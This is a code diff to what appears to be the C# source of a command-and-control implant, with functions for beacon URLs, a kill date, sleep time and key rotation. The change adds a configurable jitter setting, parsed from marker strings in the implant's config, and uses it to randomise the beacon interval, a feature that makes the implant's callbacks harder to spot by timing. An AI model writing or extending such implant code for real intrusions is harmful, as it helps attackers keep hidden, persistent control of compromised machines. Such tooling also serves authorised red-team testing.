@@ -210,6 +210,10 @@ public class Program
 			m = re.Match(x);
 			var Sleep = m.Groups[1].ToString();
 
+			re = new Regex("JITTER2025(.*)5202RETTIJ");
+			m = re.Match(x);
+			var Jitter = m.Groups[1].ToString();
+
 			re = new Regex("NEWKEY8839394(.*)4939388YEKWEN");
 			m = re.Match(x);
 			var NewKey = m.Groups[1].ToString();
@@ -218,7 +222,7 @@ public class Program
 			m = re.Match(x);
 			var IMGs = m.Groups[1].ToString();
 
-			ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs);
+			ImplantCore(baseURL, RandomURI, URLS, KillDate, Sleep, NewKey, IMGs, Jitter);
 		}
 	}
 
@@ -365,7 +369,7 @@ public class Program
 		}
 	}
 	
-	static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS)
+	static void ImplantCore(string baseURL, string RandomURI, string stringURLS, string KillDate, string Sleep, string Key, string stringIMGS, string Jitter)
 	{
 		UrlGen.Init(stringURLS, RandomURI, baseURL);
 		ImgGen.Init(stringIMGS);
@@ -381,7 +385,7 @@ public class Program
 		Console.SetOut(strOutput);
 		var exitvt = new ManualResetEvent(false);
 		var output = new StringBuilder();
-		while (!exitvt.WaitOne((int)(beacontime * 1000 * (((new Random()).Next(0, 2) > 0) ? 1.05 : 0.95))))
+		while (!exitvt.WaitOne((int)(new Random().Next((int)(beacontime * 1000 * (1F - Double.Parse(Jitter))), (int)(beacontime * 1000 * (1F + Double.Parse(Jitter)))))))
 		{
 			if (Convert.ToDateTime(KillDate) < DateTime.Now)
 			{
